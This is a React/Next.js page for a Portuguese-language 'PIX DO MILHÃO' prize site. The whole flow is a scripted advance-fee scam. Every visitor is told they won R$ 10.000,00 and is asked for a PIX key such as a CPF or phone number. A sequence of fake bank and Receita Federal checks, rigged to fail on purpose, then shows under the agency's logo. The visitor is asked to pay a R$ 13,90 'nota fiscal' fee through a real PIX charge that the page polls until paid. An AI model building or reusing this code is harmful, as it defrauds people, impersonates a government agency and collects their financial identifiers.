"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Trophy, Sparkles, Check, Clock, AlertTriangle, Copy, Loader2, ArrowRight } from "lucide-react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useUrlParams } from "@/hooks/use-url-params"

export default function BilhetePremiadoPage() {
  const [currentStep, setCurrentStep] = useState(1)
  const [ticketsChecked, setTicketsChecked] = useState(0)
  const [generatedNumbers, setGeneratedNumbers] = useState<number[]>([])
  const [isGenerating, setIsGenerating] = useState(true)
  const [loadingText, setLoadingText] = useState("Gerando números aleatórios...")
  const [winningNumber, setWinningNumber] = useState<number | null>(null)
  const [showWinningScreen, setShowWinningScreen] = useState(false)
  
  const { redirectWithParams } = useUrlParams()

  // Step 2 - PIX Key
  const [pixKeyType, setPixKeyType] = useState("email")
  const [pixKey, setPixKey] = useState("")

  // Step 3 - Loading checklist
  const [checklistItems, setChecklistItems] = useState([
    { text: "Analisando sua chave PIX...", title: "Analisando sua chave PIX...", completed: false },
    { text: "Conectando ao sistema bancário...", title: "Conectando ao sistema bancário...", completed: false },
    { text: "Verificando disponibilidade de fundos...", title: "Verificando disponibilidade de fundos...", completed: false },
    { text: "Validando informações do titular...", title: "Validando informações do titular...", completed: false },
    { text: "Consultando histórico de transações...", title: "Consultando histórico de transações...", completed: false },
    {
      text: "Estabelecendo conexão segura com a Receita Federal...",
      title: "Conectando ao sistema da Receita Federal...",
      completed: false,
    },
    { text: "Realizando pagamento...", title: "Processando transferência...", willFail: true, completed: false },
  ])
  const [currentCheckIndex, setCurrentCheckIndex] = useState(0)
  const [currentCheckTitle, setCurrentCheckTitle] = useState("Analisando sua chave PIX...")

  // Step 5 - Payment
  const [timeLeft, setTimeLeft] = useState(570) // 9:30 em segundos
  const [pixData, setPixData] = useState<any>(null)
  const [isGeneratingPix, setIsGeneratingPix] = useState(false)
  const [pixCopied, setPixCopied] = useState(false)
  const [showTimer, setShowTimer] = useState(false)
  const [paymentConfirmed, setPaymentConfirmed] = useState(false)
  const [paymentCheckInterval, setPaymentCheckInterval] = useState<NodeJS.Timeout | null>(null)

  // Step 1 - Initial animation
  useEffect(() => {
    if (currentStep === 1) {
      const numbers: number[] = []
      const totalNumbers = 6
      const loadingTexts = [
        "Gerando números aleatórios...",
        "Conectando com base de dados...",
        "Verificando bilhetes premiados...",
        "Analisando padrões de sorteio...",
        "Consultando sistema de premiação...",
        "Verificando registros de ganhadores...",
        "Comparando com sorteios anteriores...",
        "Analisando probabilidades...",
        "Calculando distribuição de prêmios...",
        "Finalizando verificação...",
      ]

      let textIndex = 0
      const textInterval = setInterval(() => {
        if (textIndex < loadingTexts.length - 1) {
          textIndex++
          setLoadingText(loadingTexts[textIndex])
        }
      }, 1800) // Aumentado de 1000ms para 1800ms para dar mais tempo de leitura

      const interval = setInterval(() => {
        if (numbers.length < totalNumbers) {
          const newNumber = Math.floor(Math.random() * 9999) + 1
          numbers.push(newNumber)
          setGeneratedNumbers([...numbers])
          setTicketsChecked(numbers.length)
        } else {
          clearInterval(interval)

          // Continuar mostrando textos por mais tempo
          setTimeout(() => {
            clearInterval(textInterval)
            setIsGenerating(false)

            // Escolher um número vencedor
            const winner = numbers[Math.floor(Math.random() * numbers.length)]
            setWinningNumber(winner)

            setTimeout(() => {
              setShowWinningScreen(true)
            }, 1500)
          }, 4000) // Aumentado para dar mais tempo
        }
      }, 1400) // Aumentado de 1200ms para 1400ms

      return () => {
        clearInterval(interval)
        clearInterval(textInterval)
      }
    }
  }, [currentStep])

  // Step 3 - Checklist animation
  useEffect(() => {
    if (currentStep === 3) {
      const interval = setInterval(() => {
        setChecklistItems((prev) => {
          const newItems = [...prev]
          if (currentCheckIndex < newItems.length) {
            // Atualizar o título conforme o item atual
            setCurrentCheckTitle(newItems[currentCheckIndex].title)

            // Se for o último item e estiver marcado para falhar, não marque como completo
            if (newItems[currentCheckIndex].willFail) {
              setTimeout(() => {
                setCurrentStep(4) // Go to error step
              }, 1500)
            } else {
              newItems[currentCheckIndex].completed = true
            }
            setCurrentCheckIndex(currentCheckIndex + 1)
          }
          return newItems
        })
      }, 1500)

      return () => clearInterval(interval)
    }
  }, [currentStep, currentCheckIndex])

  // Step 5 - Timer countdown
  useEffect(() => {
    if (currentStep === 5 && showTimer && timeLeft > 0) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [currentStep, timeLeft, showTimer])

  // Verificação de pagamento na página bilhete-premiado
  useEffect(() => {
    if (currentStep === 5 && pixData?.hash) {
      startPaymentCheck(pixData.hash)
    }
  }, [currentStep, pixData])

  const formatTimeLeft = () => {
    const minutes = Math.floor(timeLeft / 60)
    const seconds = timeLeft % 60
    return `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`
  }

  const getPixKeyPlaceholder = () => {
    switch (pixKeyType) {
      case "email":
        return "seu.email@exemplo.com"
      case "cpf":
        return "000.000.000-00"
      case "telefone":
        return "(00) 00000-0000"
      case "aleatoria":
        return "Chave será gerada automaticamente"
      default:
        return "Digite sua chave PIX"
    }
  }

  const formatPixKey = (value: string) => {
    switch (pixKeyType) {
      case "cpf":
        // Remove tudo que não é número
        const cpf = value.replace(/\D/g, "")
        // Aplica a máscara do CPF
        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
      case "telefone":
        // Remove tudo que não é número
        const phone = value.replace(/\D/g, "")
        // Aplica a máscara do telefone
        return phone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
      default:
        return value
    }
  }

  const handlePixKeyChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    if (pixKeyType === "aleatoria") {
      return // Não permite edição para chave aleatória
    }
    setPixKey(formatPixKey(value))
  }

  const handlePixKeySubmit = () => {
    if (pixKeyType === "aleatoria" || pixKey.trim()) {
      setCurrentStep(3)
    }
  }

  const handleGeneratePix = async () => {
    setIsGeneratingPix(true)

    try {
      const amount = 1390 // R$ 13,90 em centavos

      const response = await fetch("/api/gerar-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          nome: "NOME_GERADO_4DEVS", // Será substituído pelo nome gerado na API
          telefone: "11999999999",
          amount: amount,
          utm_source: null,
          utm_medium: null,
          utm_campaign: null,
          utm_term: null,
          utm_content: null,
          product_hash: "wfyh7tduhl",
          offer_hash: "wfyh7tduhl",
        }),
      })

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }

      const result = await response.json()

      if (result.erro) {
        alert(result.mensagem)
        return
      }

      console.log("PIX gerado com sucesso:", result)
      console.log("Estrutura completa da resposta:", JSON.stringify(result, null, 2))
      
      // Extrair o hash correto da resposta
      const transactionHash = result.transaction_id || result.hash || result.id
      console.log("Transaction Hash extraído:", transactionHash)
      
      // Adicionar o hash ao pixData
      const pixDataWithHash = {
        ...result,
        hash: transactionHash
      }
      
      setPixData(pixDataWithHash)
      setShowTimer(true)
    } catch (error) {
      console.error("Erro ao gerar PIX:", error)
      alert("Erro ao gerar PIX. Tente novamente.")
    } finally {
      setIsGeneratingPix(false)
    }
  }

  const startPaymentCheck = (transactionHash: string) => {
    let attempts = 0

    const checkPayment = async () => {
      attempts++
      console.log(`🔄 Verificando status do pagamento (tentativa ${attempts}/48)...`)

      try {
        const response = await fetch(`/api/verificar-status?hash=${transactionHash}`)
        
        if (!response.ok) {
          console.error("❌ Erro HTTP:", response.status, response.statusText)
          return
        }

        const paymentData = await response.json()
        console.log("📦 Resposta completa da API:", JSON.stringify(paymentData, null, 2))

        // Check different possible status fields
        const status = paymentData.payment_status || paymentData.status || paymentData.approved
        console.log("📌 Status recebido da API:", status)
        console.log("📌 Campos disponíveis:", Object.keys(paymentData))

        // Multiple checks for paid status
        const isPaid = status === "paid" || 
                     status === "approved" || 
                     status === "APPROVED" || 
                     paymentData.approved === true ||
                     paymentData.payment_status === "paid"

        if (isPaid) {
          console.log("✅ Pagamento confirmado! Redirecionando...")

          if (paymentCheckInterval) {
            clearInterval(paymentCheckInterval)
          }

          setPaymentConfirmed(true)

          // Redirecionar para a nova URL após 2 segundos
          setTimeout(() => {
            redirectWithParams("/roleta")
          }, 2000)
        }

        if (attempts >= 48) {
          console.warn("⏱️ Tempo limite atingido. Parando verificação automática.")
          if (paymentCheckInterval) {
            clearInterval(paymentCheckInterval)
          }
        }
      } catch (error) {
        console.error("❌ Erro ao verificar status da transação:", error)
      }
    }

    const interval = setInterval(checkPayment, 5000)
    setPaymentCheckInterval(interval)
  }

  const copyPixCode = () => {
    const pixCode = pixData?.pix?.pix_qr_code
    if (pixCode) {
      navigator.clipboard.writeText(pixCode)
      setPixCopied(true)
      setTimeout(() => setPixCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-800 to-black flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-radial from-yellow-900/20 via-transparent to-transparent"></div>
      <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-yellow-500 via-amber-500 to-orange-500"></div>

      {/* Step 1 - Initial Animation */}
      {currentStep === 1 && !showWinningScreen && (
        <div className="flex flex-col items-center justify-center text-white max-w-md w-full relative z-10">
          <div className="mb-8">
            <div className="h-16 w-48 relative">
              <Image src="/images/logo.png" alt="PIX DO MILHÃO" fill className="object-contain" />
            </div>
          </div>

          <div className="text-center">
            <div className="flex items-center justify-center mb-6">
              <Sparkles className="text-yellow-400 mr-2" size={24} />
              <h2 className="text-xl font-medium">{loadingText}</h2>
              <Sparkles className="text-yellow-400 ml-2" size={24} />
            </div>

            <div className="grid grid-cols-2 gap-3 mb-6">
              {generatedNumbers.map((number, index) => (
                <div
                  key={index}
                  className="bg-gradient-to-br from-yellow-500 to-amber-600 text-black font-bold text-lg py-3 px-4 rounded-lg shadow-lg border-2 border-yellow-400"
                >
                  #{number.toString().padStart(4, "0")}
                </div>
              ))}

              {Array.from({ length: 6 - generatedNumbers.length }, (_, index) => (
                <div
                  key={`empty-${index}`}
                  className="bg-gray-800 border-2 border-gray-700 py-3 px-4 rounded-lg flex items-center justify-center"
                >
                  <div className="w-6 h-6 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
                </div>
              ))}
            </div>

            <p className="text-sm text-gray-300 flex items-center justify-center">
              Bilhetes verificados:{" "}
              <span className="font-mono text-yellow-400 ml-1 text-lg font-bold">{ticketsChecked}</span>
            </p>
          </div>
        </div>
      )}

      {/* Winning Screen */}
      {currentStep === 1 && showWinningScreen && (
        <div className="flex flex-col items-center justify-center text-white w-full max-w-md relative z-10">
          <div className="mb-8 animate-bounce">
            <Trophy className="text-yellow-400" size={80} />
          </div>

          <div className="text-center mb-8 animate-fade-in">
            <h1 className="text-4xl font-bold mb-4 bg-gradient-to-r from-yellow-400 to-amber-500 bg-clip-text text-transparent">
              PARABÉNS!
            </h1>
            <p className="text-xl text-white mb-2">Você foi contemplado com</p>
            <p className="text-3xl font-bold text-green-400 mb-4">R$ 10.000,00</p>

            <div className="bg-gradient-to-br from-gray-800 to-gray-900 border-2 border-yellow-500 rounded-xl p-6 mb-6">
              <p className="text-lg text-yellow-400 font-bold mb-4">Bilhete Premiado:</p>
              <div className="bg-gradient-to-br from-green-500 to-green-600 text-black font-bold text-2xl py-4 px-6 rounded-lg shadow-lg border-2 border-green-300 animate-pulse">
                #{winningNumber?.toString().padStart(4, "0")}
              </div>
            </div>

            <Button
              onClick={() => setCurrentStep(2)}
              className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white text-lg font-bold py-3 px-8 rounded-full shadow-lg animate-pulse"
            >
              RECEBER AGORA <ArrowRight className="ml-2" size={20} />
            </Button>
          </div>
        </div>
      )}

      {/* Step 2 - PIX Key Input */}
      {currentStep === 2 && (
        <div className="bg-white rounded-2xl p-6 w-full max-w-md relative z-10 shadow-2xl">
          <h2 className="text-2xl font-bold text-center text-blue-600 mb-6">Receber Prêmio</h2>

          <div className="mb-6">
            <p className="text-gray-700 mb-4">Selecione o tipo de chave Pix</p>

            <div className="grid grid-cols-2 gap-3 mb-6">
              {[
                { value: "email", label: "Email" },
                { value: "cpf", label: "CPF" },
                { value: "telefone", label: "Telefone" },
                { value: "aleatoria", label: "Aleatória" },
              ].map((option) => (
                <label key={option.value} className="flex items-center cursor-pointer">
                  <input
                    type="radio"
                    name="pixKeyType"
                    value={option.value}
                    checked={pixKeyType === option.value}
                    onChange={(e) => {
                      setPixKeyType(e.target.value)
                      setPixKey("") // Limpa o campo ao trocar o tipo
                    }}
                    className="mr-2"
                  />
                  <span className="text-gray-700">{option.label}</span>
                </label>
              ))}
            </div>

            <p className="text-gray-700 mb-3">Digite sua chave Pix para receber o prêmio</p>
            <Input
              type="text"
              placeholder={getPixKeyPlaceholder()}
              value={pixKey}
              onChange={handlePixKeyChange}
              disabled={pixKeyType === "aleatoria"}
              className={`w-full ${pixKeyType === "aleatoria" ? "bg-gray-100 text-gray-500" : ""}`}
              maxLength={pixKeyType === "cpf" ? 14 : pixKeyType === "telefone" ? 15 : undefined}
            />
            {pixKeyType === "aleatoria" && (
              <p className="text-xs text-gray-500 mt-1">Uma chave aleatória será gerada automaticamente para você</p>
            )}
          </div>

          <Button
            onClick={handlePixKeySubmit}
            disabled={pixKeyType !== "aleatoria" && !pixKey.trim()}
            className="w-full bg-green-500 hover:bg-green-600 text-white py-3 text-lg font-bold"
          >
            RECEBER MEU SAQUE AGORA
          </Button>

          <p className="text-xs text-gray-500 text-center mt-4">
            Essa campanha é parte da premiação especial PIX DO MILHÃO. Valores acima de R$ 5 mil exigem emissão fiscal
            obrigatória (TENF).
          </p>
        </div>
      )}

      {/* Step 3 - Loading Checklist */}
      {currentStep === 3 && (
        <div className="text-white max-w-md w-full relative z-10 text-center">
          <div className="mb-8">
            <div className="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
            <h2 className="text-2xl font-bold mb-2">{currentCheckTitle}</h2>
            <div className="w-full bg-white/20 rounded-full h-2 mb-6">
              <div
                className="bg-green-400 h-2 rounded-full transition-all duration-500"
                style={{ width: `${(currentCheckIndex / checklistItems.length) * 100}%` }}
              ></div>
            </div>
          </div>

          <div className="space-y-4 text-left">
            {checklistItems.map((item, index) => (
              <div key={index} className="flex items-center">
                {index === currentCheckIndex && item.willFail ? (
                  <div className="w-6 h-6 rounded-full mr-3 flex items-center justify-center bg-red-500">
                    <AlertTriangle size={14} className="text-white" />
                  </div>
                ) : (
                  <div
                    className={`w-6 h-6 rounded-full mr-3 flex items-center justify-center ${
                      index < currentCheckIndex ? "bg-green-500" : "bg-gray-400"
                    }`}
                  >
                    {index < currentCheckIndex && <Check size={16} className="text-white" />}
                  </div>
                )}
                <span className={index < currentCheckIndex ? "text-white" : "text-gray-300"}>{item.text}</span>
                {index === currentCheckIndex && item.willFail && (
                  <span className="text-red-400 ml-2 animate-pulse">ERRO</span>
                )}
              </div>
            ))}
          </div>

          <div className="mt-8">
            <Image
              src="/images/receita-federal-logo.png"
              alt="Receita Federal"
              width={80}
              height={80}
              className="mx-auto opacity-80"
            />
          </div>

          <p className="text-xs text-gray-300 text-center mt-4">
            Essa campanha é parte da premiação especial PIX DO MILHÃO. Valores acima de R$ 5 mil exigem emissão fiscal
            obrigatória (TENF).
          </p>
        </div>
      )}

      {/* Step 4 - Error Screen */}
      {currentStep === 4 && (
        <div className="bg-white rounded-2xl p-6 w-full max-w-md relative z-10 shadow-2xl">
          <div className="text-center mb-6">
            <Image
              src="/images/receita-federal-logo.png"
              alt="Receita Federal"
              width={60}
              height={60}
              className="mx-auto mb-4"
            />
            <h2 className="text-2xl font-bold text-blue-600 mb-4">Falha na emissão da Nota Fiscal!</h2>
            <p className="text-gray-700 text-sm leading-relaxed">
              Para concluir a liberação do valor premiado de <span className="font-bold">R$ 10.000,00</span>, é
              necessária a emissão da Nota Fiscal vinculada ao CPF do titular do bilhete.
            </p>
          </div>

          <div className="bg-gray-100 rounded-lg p-4 mb-6 text-center">
            <p className="text-gray-600 text-sm mb-2">Valor da taxa:</p>
            <p className="text-3xl font-bold text-blue-600">R$ 13,90</p>
            <p className="text-gray-500 text-xs mt-2">
              Pagamento único. Necessário para liberação automática do saque.
            </p>
          </div>

          <Button
            onClick={() => setCurrentStep(5)}
            className="w-full bg-green-500 hover:bg-green-600 text-white py-3 text-lg font-bold"
          >
            Liberar meu prêmio agora
          </Button>
        </div>
      )}

      {/* Step 5 - Payment Screen */}
      {currentStep === 5 && (
        <div className="bg-white rounded-2xl p-6 w-full max-w-md relative z-10 shadow-2xl">
          <div className="text-center mb-6">
            <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Check className="text-green-600" size={24} />
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">Nota Fiscal Emitida!</h2>
            <p className="text-gray-600 text-sm">Finalize o pagamento da taxa para liberar seu prêmio</p>
          </div>

          <div className="bg-gray-50 rounded-lg p-4 mb-4">
            <div className="flex justify-between items-center mb-3">
              <div>
                <p className="text-gray-600 text-sm">Valor do Prêmio:</p>
                <p className="text-blue-600 font-bold text-lg">R$ 10.000,00</p>
              </div>
              <div className="text-right">
                <p className="text-gray-600 text-sm">Taxa de Emissão:</p>
                <p className="text-green-600 font-bold text-lg">R$ 13,90</p>
              </div>
            </div>

            <div className="border-t pt-3">
              <p className="text-gray-600 text-sm mb-1">Chave Pix para recebimento:</p>
              <p className="text-blue-600 text-sm">
                <span className="bg-blue-100 px-2 py-1 rounded">
                  {pixKeyType === "aleatoria" ? "Chave aleatória" : `Chave ${pixKeyType}`}
                </span>{" "}
                {pixKeyType === "aleatoria" ? "777161" : pixKey}
              </p>
            </div>
          </div>

          {showTimer && (
            <div className="bg-blue-50 rounded-lg p-3 mb-4">
              <div className="flex justify-between items-center">
                <span className="text-gray-700 text-sm">Tempo para pagamento:</span>
                <span className="text-blue-600 font-bold">{formatTimeLeft()}</span>
              </div>
              <div className="w-full bg-blue-200 rounded-full h-1 mt-2">
                <div
                  className="bg-blue-600 h-1 rounded-full transition-all duration-1000"
                  style={{ width: `${(timeLeft / 570) * 100}%` }}
                ></div>
              </div>
              <p className="text-gray-600 text-xs mt-2">
                Realize o pagamento dentro do prazo para garantir a liberação do seu prêmio.
              </p>
            </div>
          )}

          {pixData && (
            <>
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
                <div className="flex items-center">
                  <Clock className="text-green-600 mr-2" size={16} />
                  <div>
                    <p className="text-green-700 text-sm font-medium">Status da transferência:</p>
                    <p className="text-green-600 text-sm">
                      {paymentConfirmed ? "Pagamento confirmado - Redirecionando..." : "Em processamento"}
                    </p>
                  </div>
                </div>
                <div className="w-full bg-green-200 rounded-full h-1 mt-2">
                  <div className={`bg-green-600 h-1 rounded-full ${paymentConfirmed ? "w-full" : "w-3/4"}`}></div>
                </div>
              </div>

              {/* QR Code */}
              <div className="text-center mb-4">
                <p className="text-gray-700 text-sm mb-3">QR Code para pagamento:</p>
                <div className="bg-gray-100 p-4 rounded-lg inline-block">
                  {pixData.pix?.pix_qr_code ? (
                    <img
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pix.pix_qr_code)}`}
                      alt="QR Code"
                      className="w-48 h-48 mx-auto"
                    />
                  ) : (
                    <div className="w-48 h-48 bg-gray-300 flex items-center justify-center">
                      <span className="text-gray-500">QR Code indisponível</span>
                    </div>
                  )}
                </div>
              </div>

              {/* PIX Code */}
              <div className="mb-4">
                <p className="text-gray-700 text-sm mb-2">Copie o código PIX:</p>
                <div className="bg-gray-100 p-3 rounded-lg flex items-center justify-between">
                  <code className="text-xs text-gray-600 flex-1 mr-2 break-all">
                    {pixData.pix?.pix_qr_code || "Código PIX não disponível"}
                  </code>
                  <Button
                    onClick={copyPixCode}
                    size="sm"
                    className={`${
                      pixCopied ? "bg-green-500 hover:bg-green-600" : "bg-blue-500 hover:bg-blue-600"
                    } text-white`}
                  >
                    {pixCopied ? <Check size={16} /> : <Copy size={16} />}
                  </Button>
                </div>
              </div>

              <Button
                onClick={() => setPaymentConfirmed(true)}
                disabled={paymentConfirmed}
                className={`w-full py-3 text-lg font-bold mb-4 ${
                  paymentConfirmed
                    ? "bg-green-600 hover:bg-green-700 text-white"
                    : "bg-green-500 hover:bg-green-600 text-white"
                }`}
              >
                {paymentConfirmed ? "✓ Pagamento Confirmado - Redirecionando..." : "ATUALIZAR QR CODE PIX →"}
              </Button>
            </>
          )}

          {!pixData && (
            <Button
              onClick={handleGeneratePix}
              disabled={isGeneratingPix}
              className="w-full bg-green-500 hover:bg-green-600 text-white py-3 text-lg font-bold mb-4"
            >
              {isGeneratingPix ? (
                <>
                  <Loader2 size={20} className="mr-2 animate-spin" />
                  Gerando...
                </>
              ) : (
                "GERAR QR CODE PIX PARA PAGAMENTO"
              )}
            </Button>
          )}

          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
            <div className="flex items-start">
              <AlertTriangle className="text-yellow-600 mr-2 mt-0.5" size={16} />
              <div>
                <p className="text-yellow-800 text-sm font-medium">Importante</p>
                <p className="text-yellow-700 text-xs">
                  O pagamento da taxa de R$ 13,90 é necessário para emissão da nota fiscal e liberação do seu prêmio de
                  R$ 10.000,00.
                </p>
              </div>
            </div>
          </div>

          <div className="flex justify-between items-center mt-4 text-xs text-gray-500">
            <div className="flex items-center">
              <div className="w-3 h-3 bg-green-500 rounded-full mr-1"></div>
              Pagamento Seguro
            </div>
            <div className="flex items-center">
              <div className="w-3 h-3 bg-blue-500 rounded-full mr-1"></div>
              Dados Protegidos
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
